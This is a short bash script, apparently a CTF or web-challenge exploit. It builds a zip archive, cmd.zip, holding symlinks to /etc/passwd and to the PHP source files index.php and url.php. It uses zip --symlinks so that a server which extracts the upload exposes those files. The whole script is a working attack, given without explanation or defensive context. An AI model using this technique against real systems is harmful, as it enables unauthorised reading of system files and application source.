#!/bin/bash

for i in `seq 1 50`
do
    echo bullsh1t >> testfile.txt
done

echo "Test" > INDEX
echo "Test" > URL

ln -s /etc/passwd passwd
ln -s ../../index.php index
ln -s ../../url.php url

zip --symlinks cmd.zip testfile.txt passwd index url

rm passwd index url testfile.txt
